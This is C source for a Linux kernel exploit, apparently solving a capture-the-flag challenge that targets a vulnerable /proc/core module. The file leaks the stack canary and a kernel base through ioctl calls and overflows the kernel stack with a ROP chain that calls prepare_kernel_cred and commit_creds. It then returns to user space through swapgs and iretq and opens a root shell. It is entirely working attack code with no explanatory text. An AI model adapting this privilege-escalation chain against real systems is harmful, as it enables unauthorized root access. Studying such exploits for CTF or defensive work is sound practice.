#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>
typedef unsigned int uint;
void Panic(char *s)
{
    printf("[!] Panic:");
    puts(s);
    exit(1);
}
uint64_t u64(uint8_t *buf)
{
    uint64_t res = 0;
    for(int i =0 ; i < 8;i++)
    {
        res = res<<8;
        res+=(uint)buf[7-i];
    }
    return res;
}

char* shellcode(){
    char * gadgets = mmap(0xdead000,0x1000,7,0x22,0,0);
    char *str = "H1\xffX\xff\xd0H\x97X\xff\xd0\x0f\x01\xf8H\xcf";
    memcpy(gadgets,str,0x100);
    return gadgets;
}

// xor rdi,rdi
// pop rax
// call rax
// xchg rax,rdi
// pop rax
// call rax
// swapgs
// iretq

void shell(){
    system("/bin/sh");
}
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*] status has been saved.");
}
#define OFFSET  0x6677889C
#define READ    0x6677889B
#define OOB     0x6677889A
int main()
{
    char buf[0x1000];
    memset(buf,0,0x1000);
    int fd = open("/proc/core",2);
    if(!fd>0)
        Panic("Open");
    // Leak the data
    ioctl(fd,OFFSET,0x40);
    ioctl(fd,READ,buf);
    size_t canary           =  u64(buf);
    size_t base   =  u64(buf+0x20);
    printf("[+] Leaked Kernel Address => %p\n",base);
    printf("[+] Canary => %p\n",canary);

    // ret2user Space
    size_t * p = buf;
    size_t ct = 0x40/8;

    size_t prepare_creds    = base + (0xffffffff8109cce0-0xffffffff811dd6d1);
    size_t commit_cred      = base + (0xffffffff8109c8e0-0xffffffff811dd6d1);
    size_t rdi              = base + (0xffffffff81000b2f-0xffffffff811dd6d1);
    size_t rdx              = base + (0xffffffff810a0f49-0xffffffff811dd6d1);
    //mov rdi, rax; jmp rdx;
    size_t docall           = base + (0xffffffff8106a6d2-0xffffffff811dd6d1);
    size_t swapgs_pop       = base + (0xffffffff81a012da-0xffffffff811dd6d1);
    size_t iretq            = base + (0xffffffff81050ac2-0xffffffff811dd6d1);


    p[ct++] = canary;
    p[ct++] = 0xdeadbeef;
    p[ct++] = rdi;
    p[ct++] = 0;
    p[ct++] = prepare_creds;
    p[ct++] = rdx;
    p[ct++] = commit_cred;
    p[ct++] = docall;
    
    //Back to user space
    p[ct++] = swapgs_pop;
    p[ct++] = 0;
    p[ct++] = iretq;
    save_status();
    p[ct++] = shell;
    p[ct++] = user_cs;
    p[ct++] = user_rflags;
    p[ct++] = user_sp;
    p[ct++] = user_ss;


    // Attack
    write(fd,buf,0x100);
    size_t poc = 1;
    poc = (poc<<63) | 0x100;
    ioctl(fd,OOB,poc);  
}